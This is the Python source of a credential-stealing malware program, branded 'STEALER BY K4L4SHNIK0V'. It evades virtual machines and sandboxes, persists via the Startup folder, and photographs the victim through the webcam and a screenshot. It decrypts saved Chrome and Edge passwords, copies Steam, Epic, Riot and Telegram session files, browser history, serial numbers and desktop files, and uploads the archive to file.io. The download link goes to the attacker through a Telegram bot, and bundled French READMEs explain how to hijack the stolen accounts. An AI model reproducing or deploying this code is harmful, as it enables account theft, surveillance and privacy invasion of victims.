
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0) # type: ignore

vm_flags = 0

flag_gpu = []

bios_manufacturer = subprocess.run("wmic baseboard get manufacturer", capture_output=True) # type: ignore

flag_bios_list = [
    "VMware", "VMWARE", "vmware",
    "VirtualBox", "VIRTUALBOX", "virtualbox",
    "Xen", "XEN", "xen",
    "Bochs", "BOCHS", "bochs",
    "QEMU", "qemu", "Qemu",
    "Parallels", "PARALLELS", "parallels",
    "Microsoft Corporation", "MICROSOFT CORPORATION", "microsoft corporation",
    "KVM", "kvm", "Kvm",
    "innotek GmbH", "INNOTEK GMBH", "innotek gmbh",
    "VBox", "VBOX", "vbox",
    "VMware Virtual Platform", "VMWARE VIRTUAL PLATFORM", "vmware virtual platform",
    "Red Hat", "RED HAT", "red hat",
    "Virtual Machine", "VIRTUAL MACHINE", "virtual machine",
    "BHYVE", "bhyve", "Bhyve"
]

try:
   pc_gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
   if pc_gpu in flag_gpu:
      vm_flags += 2
except Exception:
   pass

if bios_manufacturer in flag_bios_list:
   sys.exit()

interactions = 0

mouse.Listener(
    on_move=lambda x, y: globals().__setitem__('vm_flags', interactions + 1),
    on_click=lambda x, y, button, pressed: globals().__setitem__('vm_flags', interactions + 1),
    on_scroll=lambda x, y, dx, dy: globals().__setitem__('vm_flags', interactions + 1)
).start()

keyboard.Listener(
    on_press=lambda key: globals().__setitem__('vm_flags', interactions + 1),
    on_release=lambda key: globals().__setitem__('vm_flags', interactions + 1)
).start()

time.sleep(10)

if interactions == 0:
   vm_flags += 2

vm_paths = [
    "C:\\Program Files (x86)\\VMware\\VMware Workstation\\",
    "C:\\Program Files\\VMware\\VMware Workstation\\",
    "C:\\Program Files (x86)\\VMware\\VMware Player\\",
    "C:\\Program Files\\VMware\\VMware Player\\",
    "C:\\ProgramData\\VMware\\VMware Tools\\",

    "C:\\Program Files\\Oracle\\VirtualBox\\",
    "C:\\Program Files (x86)\\Oracle\\VirtualBox\\",
    "C:\\Users\\<username>\\VirtualBox VMs\\",  

    "C:\\Program Files\\Parallels\\",
    "C:\\Program Files (x86)\\Parallels\\",

    "C:\\Program Files\\qemu\\",
    "C:\\Program Files (x86)\\qemu\\",

    "C:\\Program Files\\Xen\\",
    "C:\\Program Files (x86)\\Xen\\",

    "/etc/libvirt/qemu/", 
    "/var/lib/libvirt/images/", 
 
    "C:\\Program Files\\Bochs\\",
    "C:\\Program Files (x86)\\Bochs\\",


    "C:\\VMware\\", 
    "C:\\VirtualBox\\", 
    f"C:\\Users\\{os.getlogin()}\\Documents\\Virtual Machines\\",  
]

for path in vm_paths:
   if os.path.exists(path):
      sys.exit()

try:
   physical_cores = psutil.cpu_count(logical=False)
   if physical_cores <= 0:
      pass
   elif physical_cores < 5:
      vm_flags += 1
except Exception:
   pass

try:
   logical_cores = psutil.cpu_count(logical=True)
   if logical_cores <= 0:
      pass
   elif logical_cores < 5:
      vm_flags += 1
except Exception:
   pass

try:
   pc_ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
   if pc_ram <= 4:
      vm_flags += 1
except Exception:
   pass

if vm_flags > 3:
   sys.exit()

bot = Bot(token=BOT_TOKEN)
user = os.getlogin()
file_location = sys.executable
startup_path = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

try:
   shutil.copy(file_location, startup_path)
except Exception:
   pass

filename = os.path.basename(__file__)

if os.path.exists(startup_path + filename):
    Added_to_startup = "The stealer successfully added to victim's pc startup"
else:
    Added_to_startup = "The stealer failed to add to victim's pc startup"

how_to_use_EG = r"""
                        ______________________
<======================[STEALER BY K4L4SHNIK0V]======================>
                   ________________________________
<=================[https://github.com/k4l4shnik0pyw]=================>

1. Installer Epic Games Launcher
   - Téléchargez et installez l'Epic Games Launcher depuis le site officiel : https://www.epicgames.com/store.

2. Fermer le Launcher
   - Une fois installé, fermez complètement le logiciel pour éviter tout conflit.

3. Localiser le dossier de configuration
   - Accédez aux dossiers suivants sur le nouvel ordinateur :

     C:\Program Files (x86)\Epic Games\Launcher\Engine\Config
     C:\Program Files (x86)\Epic Games\Launcher\Portal\Data

   - Si ces dossiers n'existent pas, ouvrez et fermez le Launcher une fois pour qu'il les crée.

4. Remplacer les fichiers
   - Copiez les fichiers récupérés depuis l'ancien ordinateur (ceux extraits par le script).
   - Collez-les dans les dossiers mentionnés ci-dessus.
   - Si le système vous demande de remplacer les fichiers existants, acceptez.

5. Lancer le Launcher
   - Ouvrez l'Epic Games Launcher sur le nouvel ordinateur.
   - Vous serez connecté automatiquement au compte associé aux fichiers de configuration.


"""

how_to_use_STEAM = r"""  
                        ______________________
<======================[STEALER BY K4L4SHNIK0V]======================>
                   ________________________________
<=================[https://github.com/k4l4shnik0pyw]=================>

1. Installer Steam
   - Téléchargez et installez Steam depuis le site officiel : https://store.steampowered.com.

2. Fermer Steam
   - Une fois installé, fermez complètement Steam pour éviter tout conflit.

3. Localiser le dossier de configuration
   - Accédez aux dossiers suivants sur le nouvel ordinateur :
     C:\Program Files (x86)\Steam\config
     C:\Program Files (x86)\Steam\userdata
   - Si ces dossiers n'existent pas, ouvrez et fermez Steam une fois pour qu'il les crée.

4. Remplacer les fichiers
   - Copiez les fichiers récupérés depuis l'ancien ordinateur (ceux extraits par le script).
   - Collez-les dans les dossiers mentionnés ci-dessus.
   - Si le système vous demande de remplacer les fichiers existants, acceptez.

5. Lancer Steam
   - Ouvrez Steam sur le nouvel ordinateur.
   - Vous serez automatiquement connecté au compte associé aux fichiers de configuration, sauf si une vérification en deux étapes est activée.


"""

how_to_use_TELEGRAM = r"""
                        ______________________
<======================[STEALER BY K4L4SHNIK0V]======================>
                   ________________________________
<=================[https://github.com/k4l4shnik0pyw]=================>

1. Installer Telegram Desktop  
   - Téléchargez et installez Telegram Desktop depuis le site officiel : https://desktop.telegram.org.

2. Fermer Telegram  
   - Une fois installé, fermez complètement Telegram pour éviter tout conflit.

3. Localiser le dossier de configuration  
   - Accédez au dossier suivant sur le nouvel ordinateur :  
     C:\Users\<VotreNomUtilisateur>\AppData\Roaming\Telegram Desktop\tdata  
   - Si ce dossier n'existe pas, ouvrez et fermez Telegram une fois pour qu'il soit créé.

4. Remplacer les fichiers  
   - Copiez le dossier **tdata** récupéré depuis l'ancien ordinateur (extrait par le script).  
   - Collez ce dossier dans :  
     C:\Users\<VotreNomUtilisateur>\AppData\Roaming\Telegram Desktop\  
   - Si le système vous demande de remplacer les fichiers existants, acceptez.

5. Lancer Telegram  
   - Ouvrez Telegram Desktop sur le nouvel ordinateur.  
   - Vous serez automatiquement connecté au compte associé aux fichiers récupérés, sans besoin de saisir un mot de passe ou un code.  


"""

how_to_use_RIOT = r"""
                        ______________________
<======================[STEALER BY K4L4SHNIK0V]======================>
                   ________________________________
<=================[https://github.com/k4l4shnik0pyw]=================>

1. Installer Riot Games Client  
   - Téléchargez et installez le client Riot Games depuis le site officiel : https://www.riotgames.com.  

2. Fermer Riot Games Client  
   - Une fois installé, fermez complètement le client pour éviter tout conflit.  

3. Localiser le dossier de configuration  
   - Accédez au dossier suivant sur le nouvel ordinateur :  
     C:\Users\<VotreNomUtilisateur>\AppData\Local\Riot Games  
   - Si ce dossier n'existe pas, ouvrez et fermez le client Riot Games une fois pour qu'il soit créé.  

4. Remplacer les fichiers  
   - Copiez le dossier **Riot Games** récupéré depuis l'ancien ordinateur (extrait par le script).  
   - Collez ce dossier dans :  
     C:\Users\<VotreNomUtilisateur>\AppData\Local\  
   - Si le système vous demande de remplacer les fichiers existants, acceptez.  

5. Lancer Riot Games Client  
   - Ouvrez le client Riot Games sur le nouvel ordinateur.  
   - Vous serez automatiquement connecté au compte associé aux fichiers récupérés.  

   
"""

async def main():
   passwords_count_chrome = 0
   passwords_count_edge = 0
   epicgames_pathes = [r"C:\Program Files (x86)\Epic Games\Launcher\Engine\Config", r"C:\Program Files (x86)\Epic Games\Launcher\Portal\Data"]
   riotgames_pathes = [fr"C:\Users\{user}\AppData\Local\Riot Games"]
   telegram_path = [fr"C:\Users\{user}\AppData\Roaming\Telegram Desktop\tdata"]
   steam_pathes = [r"C:\Program Files (x86)\Steam\config", r"C:\Program Files (x86)\Steam\userdata"]

   foldername = f"{user}_datas"

   if os.path.exists(foldername):
      shutil.rmtree(foldername)
   else:
      os.makedirs(foldername, exist_ok=True)

   try:
      webcam_capture = cv2.VideoCapture(0)
      ret, frame = webcam_capture.read()
      webcam_screenshot = cv2.imwrite(f"./{foldername}/webcam.png", frame)
   except Exception:
      pass

   try:
      screen_screenshot = pyautogui.screenshot()
      screen_screenshot.save(f"./{foldername}/screenshot.png")
   except Exception:
      pass

   hostname = socket.gethostname()
   try:
      pc_ip = socket.gethostbyname(hostname)
   except Exception:
      pc_ip = "None : Error"
   try:
      pc_gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
   except Exception:
      pc_gpu = "None : Error"
   try:
      pc_cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
   except Exception:
      pc_cpu = "None : Error"
   try:
      pc_ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
   except Exception:
      pc_ram = "None : Error"
   try:
      mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
   except Exception:
      mac_address = "None : Error"
   try:
      pc_uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
   except Exception:
      pc_uuid = "None : Error"


   os.system("TASKKILL /F /IM EpicGamesLauncher.exe")
   os.system('cls')
   os.system("TASKKILL /F /IM RiotClientCrashHandler.exe")  
   os.system('cls')
   os.system("TASKKILL /F /IM Telegram.exe")
   os.system('cls')
   os.system("TASKKILL /F /IM Steam.exe")
   os.system('cls')
   os.system("TASKKILL /F /IM Chrome.exe")
   os.system('cls')
   os.system("TASKKILL /F /IM msedge.exe")
   os.system('cls')

   try:
      os.makedirs(f"./{foldername}/Epic Games", exist_ok=True)
      for config_dir in epicgames_pathes:
         if os.path.exists(config_dir):
               epic_games = "Epic Games : `Session found`"
               stolen_config_file_path = f"./{foldername}/Epic Games/{os.path.basename(config_dir)}"
               if os.path.exists(stolen_config_file_path):
                  shutil.rmtree(stolen_config_file_path)

               shutil.copytree(config_dir, stolen_config_file_path)
               with open(f"./{foldername}/Epic Games/README - How to use.txt", "w", encoding='utf-8')as readme_file:
                  readme_file.write(how_to_use_EG)
         else:
               epic_games = "Epic Games : `No session found`"

   except Exception:
      epic_games = "` An error occured `"

   try:
      os.makedirs(f"./{foldername}/Riot Games", exist_ok=True)
      for config_dir in riotgames_pathes:
         if os.path.exists(config_dir):
               riot_games = "Riot Games : `Session found`"
               stolen_config_file_path = f"./{foldername}/Riot Games/{os.path.basename(config_dir)}"
               if os.path.exists(stolen_config_file_path):
                  shutil.rmtree(stolen_config_file_path)

               shutil.copytree(config_dir, stolen_config_file_path)
               with open(f"./{foldername}/Riot Games/README - How to use.txt", "w", encoding='utf-8') as readme_file:
                  readme_file.write(how_to_use_RIOT)
         else:
               riot_games = "Riot Games : `No session found`"
   except Exception:
      riot_games = "` An error occured `"

   try:
      os.makedirs(f"./{foldername}/Telegram", exist_ok=True)
      for config_dir in telegram_path:
         if os.path.exists(config_dir):
               telegram = "Telegram : `Session found`"
               stolen_config_file_path = f"./{foldername}/Telegram/{os.path.basename(config_dir)}"
               if os.path.exists(stolen_config_file_path):
                  shutil.rmtree(stolen_config_file_path)

               shutil.copytree(config_dir, stolen_config_file_path)
               with open(f"./{foldername}/Telegram/README - How to use.txt", "w", encoding='utf-8')as readme_file:
                  readme_file.write(how_to_use_TELEGRAM)
         else:
               telegram = "Telegram : `No session found`"
   except Exception:
      telegram = "` An error occured `"

   try:
      os.makedirs(f"./{foldername}/Steam", exist_ok=True)
      for config_dir in steam_pathes:
         if os.path.exists(config_dir):
               steam = "Steam : `Session found`"
               stolen_config_file_path = f"./{foldername}/Steam/{os.path.basename(config_dir)}"
               if os.path.exists(stolen_config_file_path):
                  shutil.rmtree(stolen_config_file_path)

               shutil.copytree(config_dir, stolen_config_file_path)
               with open(f"./{foldername}/Steam/README - How to use.txt", "w", encoding='utf-8')as readme_file:
                  readme_file.write(how_to_use_STEAM)
         else:
               steam = "Steam : `No session found`"
   except Exception:
      steam = "` An error occured `"

   os.makedirs(f"./{foldername}/Browser", exist_ok=True)
   os.makedirs(f"./{foldername}/Browser/History", exist_ok=True)
   os.makedirs(f"./{foldername}/Browser/Passwords", exist_ok=True)
   os.makedirs(f"./{foldername}/System")

   try:
      with open(f"./{foldername}/System/Hardware.txt", "w", encoding='utf-8') as hardware:
         hardware.write(f"""

   <=======================[HARDWARE & LOCAL]=======================>

   - HARDWARE -                    

   Name : {user}
   Carte graphique (GPU) : {pc_gpu}
   Processeur (CPU) : {pc_cpu}
   RAM : {pc_ram} Go

   - LOCAL - 

   Adresse IP : {pc_ip}
   Adresse Mac : {mac_address}
   UUID : {pc_uuid}
                     
   """)

      disk_serial = subprocess.check_output(['wmic', 'diskdrive', 'get', 'serialnumber'], text=True, shell=True)
      motherboard_serial = subprocess.check_output(['wmic', 'baseboard', 'get', 'serialnumber'], text=True, shell=True)
      bios_serial = subprocess.check_output(['wmic', 'bios', 'get', 'serialnumber'], text=True, shell=True)
   except Exception:
      pass
   try:
      with open(f"./{foldername}/System/Serial check.txt", "w", encoding='utf-8') as serial_check:
         serial_check.write(f"""

   <=======================[SERIAL NUMBERS]=======================>

   Disque Dur : {disk_serial}
   BIOS : {bios_serial}
   Carte mère : {motherboard_serial}

   """)

   except Exception:
      pass

   chrome_hitory_path = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\History"

   if os.path.exists(chrome_hitory_path):
      try:
         conn = sqlite3.connect(chrome_hitory_path)
         cursor = conn.cursor()

         request = "SELECT url, title, visit_count, last_visit_time FROM urls"
         cursor.execute(request)

         rows = cursor.fetchall()

         with open(f"./{foldername}/Browser/History/Chrome.txt", "w", encoding='utf-8') as history:
            history.write("""
                                            ___________________
      <====================================[HISTORIQUE : CHROME]====================================>  
      """)
            for row in rows:
               url, title, visits_count, last_visit_time = row
               history.write(f"""               
      ____________________________________________________________________________
      TITRE : {title}
      URL : {url} 
      NOMBRE DE VISITES : {visits_count} """)
      except   Exception:
         pass

   edge_hitory_path = fr"C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Default\History"

   if os.path.exists(edge_hitory_path):
      try:
            conn = sqlite3.connect(edge_hitory_path)
            cursor = conn.cursor()

            request = "SELECT url, title, visit_count, last_visit_time FROM urls"
            cursor.execute(request)

            rows = cursor.fetchall()

            with open(f"./{foldername}/Browser/History/Edge.txt", "w", encoding='utf-8') as history:
               history.write("""
                                               _________________
         <====================================[HISTORIQUE : EDGE]====================================>  
         """)
               for row in rows:
                  url, title, visits_count, last_visit_time = row
                  history.write(f"""               
         ____________________________________________________________________________
         TITRE : {title}
         URL : {url} 
         NOMBRE DE VISITES : {visits_count} """)
      except Exception:
         pass
   
   local_state_path = fr"C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Local State"

   if os.path.exists(local_state_path):
      try:
         with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)

         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
         master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
      except Exception:
         pass

      login_data_path = fr"C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"

      if os.path.exists(login_data_path):
         try:
            conn = sqlite3.connect(login_data_path)
            cursor = conn.cursor()

            query = "SELECT origin_url, username_value, password_value FROM logins"
            cursor.execute(query)

            with open(f"./{foldername}/Browser/Passwords/Edge.txt", "w", encoding='utf-8') as pass_file:
               pass_file.write("""
                                              ________________
         <===================================[PASSWORDS : Edge]===================================>
         """)
               for row in cursor.fetchall():
                  passwords_count_edge += 1
                  origin_url = row[0]
                  username = row[1]
                  encrypted_password = row[2] 

                  iv = encrypted_password[3:15]
                  payload = encrypted_password[15:]
                  cipher = AES.new(master_key, AES.MODE_GCM, iv)
                  decrypted_pass = cipher.decrypt(payload)[:-16].decode()
                  pass_file.write(f"""
         ___________________________________________________________________________________________
         URL : {origin_url}
         USERNAME/MAIL : {username}
         PASSWORD : {decrypted_pass}""")
         except Exception:
            passwords_count_edge = "An error occured"
            pass

   local_state_path = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Local State"

   if os.path.exists(local_state_path):
      try:
         with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)

         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
         master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
      except Exception:
         pass

   login_data_path = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Login Data"

   if os.path.exists(login_data_path):
      try:
         conn = sqlite3.connect(login_data_path)
         cursor = conn.cursor()

         query = "SELECT origin_url, username_value, password_value FROM logins"
         cursor.execute(query)

         with open(f"./{foldername}/Browser/Passwords/Chrome.txt", "w", encoding='utf-8') as pass_file:

            pass_file.write("""
      <===================================[PASSWORDS : Chrome]===================================>
      """)
            for row in cursor.fetchall():
               passwords_count_chrome += 1
               origin_url = row[0]
               username = row[1]
               encrypted_password = row[2] 

               iv = encrypted_password[3:15]
               payload = encrypted_password[15:]
               cipher = AES.new(master_key, AES.MODE_GCM, iv)
               decrypted_pass = cipher.decrypt(payload)[:-16].decode()
               pass_file.write(f"""
      ___________________________________________________________________________________________
      URL : {origin_url}
      USERNAME/MAIL : {username}
      PASSWORD : {decrypted_pass}""")
      except Exception:
         passwords_count_chrome = "` An error occured `"

   os.makedirs(f"./{foldername}/Stolen files", exist_ok=True)

   desktop_path = fr"C:\Users\{user}\OneDrive\Documents\Desktop"

   if not os.path.exists(desktop_path):
      desktop_path = Path.home() / 'Desktop'
      if not os.path.exists(desktop_path):
         desktop_path = fr"C:\Users\{user}\Bureau"
         if not os.path.exists(desktop_path):
            desktop_path = fr"C:\Users\{user}\OneDrive\Documents\Bureau"
   
   destination_folder = os.path.join(f"./{foldername}/Stolen files")
   stolen_files_dir_size = 0
   stolen_files = 0
   try:
      for file in os.listdir(desktop_path):
         if os.path.isfile(os.path.join(desktop_path, file)):
            extension = os.path.splitext(file)[1]
            file_size = os.path.getsize(os.path.join(desktop_path, file))
            if extension in [".txt", ".csv", ".json", ".xml", ".html", ".css", ".js", ".md", ".log", ".ini", ".png", ".jpg", ".jpeg", ".gif", ".webp", ".ico", ".svg", ".mp3", ".ogg", ".webm", ".pdf"] and file_size <= 1024 * 1024:
                  try:
                     file_path = os.path.join(desktop_path, file)
                     shutil.copy(file_path, destination_folder)
                     stolen_files += 1
                     stolen_files_dir_size = 0
                     for dirpath, dirnames, filenames in os.walk(destination_folder):
                        for file in filenames:
                              file_path = os.path.join(dirpath, file)
                              stolen_files_dir_size += os.path.getsize(file_path)
                     if stolen_files_dir_size >= (1024 * 1024) * 10:
                        break
                  except Exception:
                     continue

   except Exception:
      stolen_files = " ` An error occured `"

   shutil.make_archive(foldername, "zip", foldername)

   with open(f"{foldername}.zip", 'rb') as f:
        response = requests.post('https://file.io', files={'file': f})
   shutil.rmtree(foldername)

   data = response.json()
   
   MESSAGE = f"""
***LOGGED INFORMATION !***

🔐 Passwords found (Chrome): `{passwords_count_chrome}`
🔐 Passwords found (Edge): `{passwords_count_edge}`
📁 Stolen files: `{stolen_files}`

⚙️ *System Info*

PC Name: `{user}`  
IP Address: `{pc_ip}`  
MAC Address: `{mac_address}`  
UUID: `{pc_uuid}`  
Processor (CPU): `{pc_cpu}`  
Graphics Card (GPU): `{pc_gpu}`  
RAM Memory: `{pc_ram} GB`

📁 *Sessions Found*:

{epic_games}  
{telegram}  
{riot_games}  
{steam}  

📝 *Stealer File Information*:

File Path: `{file_location}`  
Status: {Added_to_startup}

📦 *Download Link for Stolen Data:* 
[*Click here*]({data.get('link', 'Unavailable link')}) to download the victim's data.

**Note:** The file is available for 2 weeks. After this period, it will be automatically deleted!
"""


   screenshot_path = fr"./{foldername}/screenshot.png"

   if os.path.exists(screenshot_path):
         await bot.send_message(chat_id=CHAT_ID, text=MESSAGE, parse_mode="Markdown", photo=open(screenshot_path, "rb"))
   else:
         await bot.send_message(chat_id=CHAT_ID, text=MESSAGE, parse_mode="Markdown")

   os.remove(f"{foldername}.zip")

   try:
      os.system(f'''powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('An unknown error occured', 'Error', [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)"''')
   except Exception:
      pass

if __name__ == '__main__':
   asyncio.run(main())